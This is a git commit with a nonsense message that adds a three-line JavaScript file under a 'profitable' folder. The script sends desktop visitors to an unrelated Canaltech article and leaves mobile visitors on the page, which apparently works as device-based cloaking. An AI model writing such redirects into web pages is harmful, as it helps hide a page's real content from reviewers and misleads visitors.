3678dd595341c539cab3f4be8f9ab4e8f4daec41
amigos77722 <fernandinhanegro@gmail.com>
2025-01-07 20:33:46 -0300

    23423432

---
+++ profitable/js/12365.js
@@ -0,0 +1,3 @@
+if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://canaltech.com.br/apps/como-avaliar-podcasts-no-spotify/';
+  }
